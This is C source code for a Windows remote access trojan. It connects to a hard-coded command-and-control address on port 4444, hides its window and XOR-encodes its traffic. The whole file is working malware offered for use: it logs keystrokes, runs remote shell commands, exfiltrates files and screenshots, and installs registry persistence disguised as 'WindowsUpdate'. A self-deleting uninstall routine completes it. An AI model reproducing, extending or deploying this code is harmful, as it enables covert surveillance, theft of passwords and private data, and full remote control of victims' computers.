/**
 * agent.c - Complete agent with working camera and fixed keylogger
 * FIXED: Keylogger only sends on command, never auto-sends
 * 
 * Compile: gcc agent.c -o agent.exe -lws2_32 -lgdi32 -luser32 -lole32 -loleaut32 -mwindows -O2 -s
 */

#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <tlhelp32.h>
    #include <shlobj.h>
    #include <shlwapi.h>
    #include <winerror.h>
    #include <shellapi.h>
    
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "shell32.lib")
    #pragma comment(lib, "shlwapi.lib")
    #pragma comment(lib, "gdi32.lib")
    #pragma comment(lib, "ole32.lib")
    #pragma comment(lib, "oleaut32.lib")
    
    #define SOCKET_CLOSE(s) closesocket(s)
    #define POPEN _popen
    #define PCLOSE _pclose
    #define sleep(seconds) Sleep((seconds) * 1000)
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define SOCKET_CLOSE(s) close(s)
    #define POPEN popen
    #define PCLOSE pclose
#endif

#define DEFAULT_HOST "13.60.186.177"
#define DEFAULT_PORT 4444
#define MAX_PAYLOAD (10 * 1024 * 1024)
#define CHUNK_SIZE 1024


#define CMD_SHELL       0x01
#define CMD_UPLOAD      0x02
#define CMD_DOWNLOAD    0x03
#define CMD_SCREENSHOT  0x04
#define CMD_KEYSTROKE   0x05
#define CMD_PERSIST     0x06
#define CMD_UNINSTALL   0x07
#define CMD_CAMERA      0x08

// XOR key
static const uint8_t xor_key[16] = {
    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
};

#ifdef _DEBUG
    #define DEBUG_PRINT(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
    #define DEBUG_PRINT(fmt, ...)
#endif

/* ============================================================================
 * KEYLOGGER STRUCTURES -under
 * ============================================================================ */

typedef struct {
    char buffer[65536];      // 64KB buffer
    int pos;
    CRITICAL_SECTION lock;
    FILE* log_file;
    int active;
    HANDLE thread;
} KeyloggerState;

static KeyloggerState g_keylogger = {0};

/* ============================================================================
 * ENCRYPTION FUNCTIONS
 * ============================================================================ */

static void xor_buffer(uint8_t* data, size_t len, size_t offset) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= xor_key[(offset + i) % 16];
    }
}

static int send_all(SOCKET sock, const uint8_t* buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        int sent = send(sock, (const char*)buf + total, (int)(len - total), 0);
        if (sent <= 0) return -1;
        total += sent;
    }
    return 0;
}

static int recv_all(SOCKET sock, uint8_t* buf, size_t len) {
    size_t total = 0;
    while (total < len) {
        int received = recv(sock, (char*)buf + total, (int)(len - total), 0);
        if (received <= 0) return -1;
        total += received;
    }
    return 0;
}

static int send_frame(SOCKET sock, uint8_t cmd, const uint8_t* payload, uint32_t payload_len) {
    uint8_t* frame;
    size_t frame_len = 5 + payload_len;
    
    if (payload_len > MAX_PAYLOAD) {
        DEBUG_PRINT("[ERROR] Payload too large: %u > %d\n", payload_len, MAX_PAYLOAD);
        return -1;
    }
    
    frame = (uint8_t*)malloc(frame_len);
    if (!frame) return -1;
    
    frame[0] = cmd;
    frame[1] = (payload_len >> 24) & 0xFF;
    frame[2] = (payload_len >> 16) & 0xFF;
    frame[3] = (payload_len >> 8) & 0xFF;
    frame[4] = payload_len & 0xFF;
    
    if (payload_len > 0 && payload) {
        memcpy(frame + 5, payload, payload_len);
    }
    
    xor_buffer(frame, frame_len, 0);
    int result = send_all(sock, frame, frame_len);
    free(frame);
    return result;
}

static int recv_frame(SOCKET sock, uint8_t* cmd, uint8_t** payload, uint32_t* payload_len) {
    uint8_t header[5];
    
    if (recv_all(sock, header, 5) != 0) return -1;
    xor_buffer(header, 5, 0);
    
    *cmd = header[0];
    *payload_len = (header[1] << 24) | (header[2] << 16) | (header[3] << 8) | header[4];
    
    if (*payload_len > MAX_PAYLOAD) return -1;
    
    if (*payload_len > 0) {
        *payload = (uint8_t*)malloc(*payload_len);
        if (!*payload) return -1;
        
        if (recv_all(sock, *payload, *payload_len) != 0) {
            free(*payload);
            return -1;
        }
        xor_buffer(*payload, *payload_len, 5);
    } else {
        *payload = NULL;
    }
    
    return 0;
}

/* ============================================================================
 * KEYLOGGER THREAD - Captures keys, NEVER auto-sends
 * ============================================================================ */

static DWORD WINAPI keylogger_thread(LPVOID param) {
    (void)param;
    BYTE last_state[256] = {0};
    BYTE keyboard_state[256];
    
    while (g_keylogger.active) {
        GetKeyboardState(keyboard_state);
        
        for (int key = 8; key <= 254; key++) {
            SHORT state = GetAsyncKeyState(key);
            BYTE current = (BYTE)((state >> 8) & 1);
            
            if (current && !last_state[key]) {
                char output[64] = {0};
                
                // Handle special keys
                switch (key) {
                    case VK_SPACE:  strcpy(output, " "); break;
                    case VK_RETURN: strcpy(output, "\n"); break;
                    case VK_BACK:   strcpy(output, "[BACKSPACE]"); break;
                    case VK_TAB:    strcpy(output, "[TAB]"); break;
                    case VK_ESCAPE: strcpy(output, "[ESC]"); break;
                    case VK_DELETE: strcpy(output, "[DEL]"); break;
                    case VK_SHIFT:  strcpy(output, "[SHIFT]"); break;
                    case VK_CONTROL:strcpy(output, "[CTRL]"); break;
                    case VK_MENU:   strcpy(output, "[ALT]"); break;
                    default: {
                        UINT scan = MapVirtualKeyA(key, MAPVK_VK_TO_VSC);
                        WORD wchar[2] = {0};
                        if (ToUnicode(key, scan, keyboard_state, wchar, 2, 0) > 0) {
                            WideCharToMultiByte(CP_UTF8, 0, wchar, 1, output, sizeof(output), NULL, NULL);
                        }
                        break;
                    }
                }
                
                if (output[0]) {
                    EnterCriticalSection(&g_keylogger.lock);
                    
                    // Add timestamp when buffer empty
                    if (g_keylogger.pos == 0) {
                        time_t now = time(NULL);
                        struct tm* tm_info = localtime(&now);
                        char time_str[32];
                        strftime(time_str, sizeof(time_str), "\n[%H:%M:%S] ", tm_info);
                        int written = snprintf(g_keylogger.buffer + g_keylogger.pos,
                                              sizeof(g_keylogger.buffer) - g_keylogger.pos,
                                              "%s", time_str);
                        if (written > 0) g_keylogger.pos += written;
                    }
                    
                    // Write the key
                    int written = snprintf(g_keylogger.buffer + g_keylogger.pos,
                                          sizeof(g_keylogger.buffer) - g_keylogger.pos,
                                          "%s", output);
                    if (written > 0 && g_keylogger.pos + written < (int)sizeof(g_keylogger.buffer)) {
                        g_keylogger.pos += written;
                    }
                    
                    // Rotate buffer if full (never auto-send)
                    if (g_keylogger.pos > (int)sizeof(g_keylogger.buffer) - 1024) {
                        int keep = g_keylogger.pos / 2;
                        memmove(g_keylogger.buffer, g_keylogger.buffer + keep, g_keylogger.pos - keep);
                        g_keylogger.pos -= keep;
                    }
                    
                    LeaveCriticalSection(&g_keylogger.lock);
                }
            }
            last_state[key] = current;
        }
        Sleep(25);
    }
    return 0;
}

static void start_keylogger(void) {
    if (g_keylogger.active) return;
    
    InitializeCriticalSection(&g_keylogger.lock);
    g_keylogger.pos = 0;
    g_keylogger.active = 1;
    memset(g_keylogger.buffer, 0, sizeof(g_keylogger.buffer));
    
    // Optional: log to file as backup
    char log_path[MAX_PATH];
    GetTempPathA(MAX_PATH, log_path);
    strcat(log_path, "keylog.txt");
    g_keylogger.log_file = fopen(log_path, "a");
    
    g_keylogger.thread = CreateThread(NULL, 0, keylogger_thread, NULL, 0, NULL);
}

static void stop_keylogger(void) {
    if (!g_keylogger.active) return;
    
    g_keylogger.active = 0;
    if (g_keylogger.thread) {
        WaitForSingleObject(g_keylogger.thread, 3000);
        CloseHandle(g_keylogger.thread);
        g_keylogger.thread = NULL;
    }
    if (g_keylogger.log_file) {
        fclose(g_keylogger.log_file);
        g_keylogger.log_file = NULL;
    }
    DeleteCriticalSection(&g_keylogger.lock);
}

static void cmd_keystroke(SOCKET client) {
    EnterCriticalSection(&g_keylogger.lock);
    
    if (g_keylogger.pos > 0) {
        DEBUG_PRINT("[KEYLOG] Sending %d bytes\n", g_keylogger.pos);
        send_frame(client, CMD_KEYSTROKE, (uint8_t*)g_keylogger.buffer, g_keylogger.pos);
        g_keylogger.pos = 0;
        memset(g_keylogger.buffer, 0, sizeof(g_keylogger.buffer));
    } else {
        send_frame(client, CMD_KEYSTROKE, (uint8_t*)"No keys captured", 16);
    }
    
    LeaveCriticalSection(&g_keylogger.lock);
}

/* ============================================================================
 * CAMERA CAPTURE
 * ============================================================================ */

static void cmd_camera(SOCKET client) {
    DEBUG_PRINT("[CAMERA] ========== START ==========\n");
    
    char temp_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_file);
    snprintf(temp_file + strlen(temp_file), sizeof(temp_file) - strlen(temp_file), 
             "camera_%d.jpg", (int)time(NULL));
    
    char cmdline[1024];
    snprintf(cmdline, sizeof(cmdline),
        "powershell -Command \""
        "Add-Type -AssemblyName System.Drawing; "
        "$camera = New-Object System.Drawing.Bitmap(640,480); "
        "$g = [System.Drawing.Graphics]::FromImage($camera); "
        "$g.CopyFromScreen(0,0,0,0,$camera.Size); "
        "$camera.Save('%s')\" 2>nul", temp_file);
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    int success = 0;
    
    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        if (GetFileAttributesA(temp_file) != INVALID_FILE_ATTRIBUTES) {
            success = 1;
        }
    }
    
    if (!success) {
        DEBUG_PRINT("[CAMERA] Camera not available, falling back to screenshot\n");
        
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        HBITMAP hOld = (HBITMAP)SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFOHEADER bi = {0};
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        
        DWORD row_size = ((width * 24 + 31) / 32) * 4;
        DWORD img_size = row_size * height;
        
        uint8_t* pixels = (uint8_t*)malloc(img_size);
        if (pixels) {
            GetDIBits(hdcMem, hBitmap, 0, height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
            
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + img_size;
            bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
            
            uint8_t* bmp = (uint8_t*)malloc(bf.bfSize);
            if (bmp) {
                memcpy(bmp, &bf, sizeof(BITMAPFILEHEADER));
                memcpy(bmp + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
                memcpy(bmp + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, img_size);
                
                FILE* fp = fopen(temp_file, "wb");
                if (fp) {
                    fwrite(bmp, 1, bf.bfSize, fp);
                    fclose(fp);
                    success = 1;
                }
                free(bmp);
            }
            free(pixels);
        }
        
        SelectObject(hdcMem, hOld);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
    }
    
    if (success) {
        FILE* fp = fopen(temp_file, "rb");
        if (fp) {
            fseek(fp, 0, SEEK_END);
            long file_size = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            
            if (file_size > 0 && file_size <= MAX_PAYLOAD) {
                uint8_t* file_data = (uint8_t*)malloc(file_size);
                if (file_data) {
                    fread(file_data, 1, file_size, fp);
                    DEBUG_PRINT("[CAMERA] Sending %ld bytes\n", file_size);
                    send_frame(client, CMD_CAMERA, file_data, file_size);
                    free(file_data);
                }
            }
            fclose(fp);
            DeleteFileA(temp_file);
        }
    } else {
        DEBUG_PRINT("[CAMERA] Failed to capture\n");
        send_frame(client, CMD_CAMERA, (uint8_t*)"ERROR: Camera not available", 27);
    }
    
    DEBUG_PRINT("[CAMERA] ========== COMPLETE ==========\n");
}

/* ============================================================================
 * SCREENSHOT FUNCTION
 * ============================================================================ */

static void cmd_screenshot(SOCKET client) {
    DEBUG_PRINT("[SCREENSHOT] ========== START ==========\n");
    
    #ifdef _WIN32
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        DEBUG_PRINT("[SCREENSHOT] Screen size: %dx%d\n", width, height);
        
        HDC hdcScreen = GetDC(NULL);
        if (!hdcScreen) {
            DEBUG_PRINT("[SCREENSHOT] Failed to get screen DC\n");
            send_frame(client, CMD_SCREENSHOT, (uint8_t*)"ERROR: Cannot get screen DC", 27);
            return;
        }
        
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        if (!hdcMem) {
            ReleaseDC(NULL, hdcScreen);
            send_frame(client, CMD_SCREENSHOT, (uint8_t*)"ERROR: Cannot create memory DC", 30);
            return;
        }
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hBitmap) {
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            send_frame(client, CMD_SCREENSHOT, (uint8_t*)"ERROR: Cannot create bitmap", 27);
            return;
        }
        
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
        
        BITMAPINFOHEADER bi = {0};
        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = width;
        bi.biHeight = -height;
        bi.biPlanes = 1;
        bi.biBitCount = 24;
        bi.biCompression = BI_RGB;
        
        DWORD row_size = ((width * 24 + 31) / 32) * 4;
        DWORD image_size = row_size * height;
        
        uint8_t* pixels = (uint8_t*)malloc(image_size);
        if (!pixels) {
            SelectObject(hdcMem, hOldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(hdcMem);
            ReleaseDC(NULL, hdcScreen);
            send_frame(client, CMD_SCREENSHOT, (uint8_t*)"ERROR: Pixel buffer allocation failed", 36);
            return;
        }
        
        GetDIBits(hdcMem, hBitmap, 0, height, pixels, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        
        BITMAPFILEHEADER bf = {0};
        bf.bfType = 0x4D42;
        bf.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + image_size;
        bf.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        uint32_t total_size = bf.bfSize;
        uint8_t* bmp = (uint8_t*)malloc(total_size);
        
        if (bmp) {
            memcpy(bmp, &bf, sizeof(BITMAPFILEHEADER));
            memcpy(bmp + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
            memcpy(bmp + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), pixels, image_size);
            
            DEBUG_PRINT("[SCREENSHOT] Sending %u bytes\n", total_size);
            send_frame(client, CMD_SCREENSHOT, bmp, total_size);
            free(bmp);
        }
        
        free(pixels);
        
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
    #else
        send_frame(client, CMD_SCREENSHOT, (uint8_t*)"ERROR: Not supported on Linux", 29);
    #endif
    
    DEBUG_PRINT("[SCREENSHOT] ========== COMPLETE ==========\n");
}

/* ============================================================================
 * SHELL COMMAND
 * ============================================================================ */

static void cmd_shell(SOCKET client, const uint8_t* data, size_t data_len) {
    char* cmd = (char*)malloc(data_len + 1);
    if (!cmd) return;
    
    memcpy(cmd, data, data_len);
    cmd[data_len] = '\0';
    
    DEBUG_PRINT("[SHELL] Executing: %s\n", cmd);
    
    FILE* pipe = POPEN(cmd, "r");
    free(cmd);
    
    if (!pipe) {
        send_frame(client, CMD_SHELL, (uint8_t*)"Failed to execute", 17);
        return;
    }
    
    char buffer[CHUNK_SIZE];
    size_t bytes;
    while ((bytes = fread(buffer, 1, sizeof(buffer), pipe)) > 0) {
        send_frame(client, CMD_SHELL, (uint8_t*)buffer, bytes);
    }
    
    PCLOSE(pipe);
    send_frame(client, CMD_SHELL, NULL, 0);
}

/* ============================================================================
 * UPLOAD COMMAND
 * ============================================================================ */

static void cmd_upload(SOCKET client, const uint8_t* data, size_t data_len) {
    if (data_len < 2) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Invalid upload data", 26);
        return;
    }
    
    uint16_t path_len = (data[0] << 8) | data[1];
    
    if (path_len == 0 || path_len > 256) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Invalid filename length", 30);
        return;
    }
    
    if (data_len < 2 + path_len) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Incomplete upload data", 28);
        return;
    }
    
    char* path = (char*)malloc(path_len + 1);
    if (!path) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Memory allocation failed", 31);
        return;
    }
    
    memcpy(path, data + 2, path_len);
    path[path_len] = '\0';
    
    size_t file_len = data_len - 2 - path_len;
    const uint8_t* file_data = data + 2 + path_len;
    
    DEBUG_PRINT("[UPLOAD] %s (%zu bytes)\n", path, file_len);
    
    FILE* fp = fopen(path, "wb");
    free(path);
    
    if (!fp) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Cannot open file", 24);
        return;
    }
    
    size_t written = fwrite(file_data, 1, file_len, fp);
    fclose(fp);
    
    if (written == file_len) {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"SUCCESS: Upload complete", 24);
    } else {
        send_frame(client, CMD_UPLOAD, (uint8_t*)"ERROR: Write failed", 19);
    }
}

/* ============================================================================
 * DOWNLOAD COMMAND
 * ============================================================================ */

static void cmd_download(SOCKET client, const uint8_t* data, size_t data_len) {
    if (data_len == 0) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: No filename", 18);
        return;
    }
    
    char* filename = (char*)malloc(data_len + 1);
    if (!filename) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: Memory allocation failed", 31);
        return;
    }
    
    memcpy(filename, data, data_len);
    filename[data_len] = '\0';
    
    DEBUG_PRINT("[DOWNLOAD] %s\n", filename);
    
    FILE* fp = fopen(filename, "rb");
    free(filename);
    
    if (!fp) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: File not found", 21);
        return;
    }
    
    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    
    if (file_size <= 0) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: File is empty", 20);
        fclose(fp);
        return;
    }
    
    if (file_size > MAX_PAYLOAD) {
        char error[64];
        snprintf(error, sizeof(error), "ERROR: File too large: %ld", file_size);
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)error, strlen(error));
        fclose(fp);
        return;
    }
    
    uint8_t* file_data = (uint8_t*)malloc(file_size);
    if (!file_data) {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: Memory allocation failed", 31);
        fclose(fp);
        return;
    }
    
    size_t bytes_read = fread(file_data, 1, file_size, fp);
    fclose(fp);
    
    if (bytes_read == (size_t)file_size) {
        send_frame(client, CMD_DOWNLOAD, file_data, file_size);
    } else {
        send_frame(client, CMD_DOWNLOAD, (uint8_t*)"ERROR: Read failed", 18);
    }
    
    free(file_data);
}

/* ============================================================================
 * PERSISTENCE COMMAND
 * ============================================================================ */

static void cmd_persist(SOCKET client) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey);
    
    if (result == 0) {
        result = RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ,
                              (BYTE*)exe_path, (DWORD)strlen(exe_path));
        RegCloseKey(hKey);
        
        if (result == 0) {
            send_frame(client, CMD_PERSIST, (uint8_t*)"SUCCESS: Persistence installed", 30);
        } else {
            send_frame(client, CMD_PERSIST, (uint8_t*)"ERROR: Failed to set registry", 29);
        }
    } else {
        send_frame(client, CMD_PERSIST, (uint8_t*)"ERROR: Cannot open registry", 27);
    }
}

/* ============================================================================
 * UNINSTALL COMMAND
 * ============================================================================ */

static void cmd_uninstall(SOCKET client) {
    send_frame(client, CMD_UNINSTALL, (uint8_t*)"Uninstalling...", 15);
    
    stop_keylogger();
    
    RegDeleteKeyA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate");
    
    char bat_path[MAX_PATH];
    char exe_path[MAX_PATH];
    GetTempPathA(MAX_PATH, bat_path);
    strcat(bat_path, "uninst.bat");
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    FILE* bat = fopen(bat_path, "w");
    if (bat) {
        fprintf(bat, "@echo off\n");
        fprintf(bat, ":loop\n");
        fprintf(bat, "timeout /t 1 /nobreak >nul\n");
        fprintf(bat, "del /F /Q \"%s\" 2>nul\n", exe_path);
        fprintf(bat, "if exist \"%s\" goto loop\n", exe_path);
        fprintf(bat, "del /F /Q \"%%~f0\" 2>nul\n");
        fclose(bat);
        ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);
    }
    
    exit(0);
}

/* ============================================================================
 * MAIN FUNCTION
 * ============================================================================ */

int main(int argc, char** argv) {
    const char* host = (argc > 1) ? argv[1] : DEFAULT_HOST;
    int port = (argc > 2) ? atoi(argv[2]) : DEFAULT_PORT;
    
    #ifdef _WIN32
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            return 1;
        }
        #ifndef _DEBUG
            ShowWindow(GetConsoleWindow(), SW_HIDE);
        #endif
    #endif
    
    DEBUG_PRINT("[AGENT] Starting...\n");
    DEBUG_PRINT("[AGENT] Connecting to %s:%d\n", host, port);
    
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        DEBUG_PRINT("[ERROR] Socket creation failed\n");
        return 1;
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons((u_short)port);
    addr.sin_addr.s_addr = inet_addr(host);
    
    int retry = 0;
    while (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0 && retry < 5) {
        DEBUG_PRINT("[AGENT] Connection attempt %d failed, retrying...\n", retry + 1);
        sleep(5);
        retry++;
    }
    
    if (retry >= 5) {
        DEBUG_PRINT("[ERROR] Connection failed after 5 attempts\n");
        SOCKET_CLOSE(sock);
        return 1;
    }
    
    DEBUG_PRINT("[AGENT] Connected successfully!\n");
    
    start_keylogger();
    
    while (1) {
        uint8_t cmd = 0;
        uint8_t* payload = NULL;
        uint32_t payload_len = 0;
        
        if (recv_frame(sock, &cmd, &payload, &payload_len) != 0) {
            DEBUG_PRINT("[AGENT] Connection lost\n");
            break;
        }
        
        switch (cmd) {
            case CMD_SHELL:
                cmd_shell(sock, payload, payload_len);
                break;
            case CMD_UPLOAD:
                cmd_upload(sock, payload, payload_len);
                break;
            case CMD_DOWNLOAD:
                cmd_download(sock, payload, payload_len);
                break;
            case CMD_SCREENSHOT:
                cmd_screenshot(sock);
                break;
            case CMD_KEYSTROKE:
                cmd_keystroke(sock);
                break;
            case CMD_PERSIST:
                cmd_persist(sock);
                break;
            case CMD_UNINSTALL:
                cmd_uninstall(sock);
                break;
            case CMD_CAMERA:
                cmd_camera(sock);
                break;
            default:
                DEBUG_PRINT("[AGENT] Unknown command: 0x%02X\n", cmd);
                break;
        }
        
        if (payload) free(payload);
    }
    
    stop_keylogger();
    SOCKET_CLOSE(sock);
    DEBUG_PRINT("[AGENT] Exiting\n");
    return 0;
}
